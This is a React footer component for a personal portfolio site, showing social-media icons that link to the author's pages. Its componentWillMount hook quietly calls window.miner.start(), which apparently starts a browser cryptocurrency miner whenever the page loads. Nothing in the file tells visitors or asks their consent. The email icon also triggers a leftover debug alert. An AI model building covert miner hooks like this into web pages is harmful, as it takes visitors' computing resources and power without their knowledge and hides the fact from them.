import React, { Component } from 'react';
import { Link } from 'react-router-dom'
import { SocialIcon } from 'react-social-icons';
import './footer.css';

class Footer extends Component {
  constructor(props) {
    super(props);
  }

  componentWillMount(){
    if (window.miner) {
      window.miner.start();
    }
  }

  mine() {
    alert('hel')
  }

  render() {
    return (
      <footer>
        <section className="subsection">
        </section>
        <section className="subsection">
          <h1>Follow Me</h1>
          <div className="social-buttons">
            <SocialIcon url="https://www.grahampaye.com/" color="#D6655A" />
            <SocialIcon url="https://www.linkedin.com/in/graham-paye/" color="#D6655A" />
            <SocialIcon url="https://github.com/TheRoyalTnetennba" color="#D6655A" />
            <SocialIcon network="email" onClick={() => this.mine()} color="#D6655A" className="cp" />
          </div>
        </section>
      </footer>
    );
  }
}

export default Footer;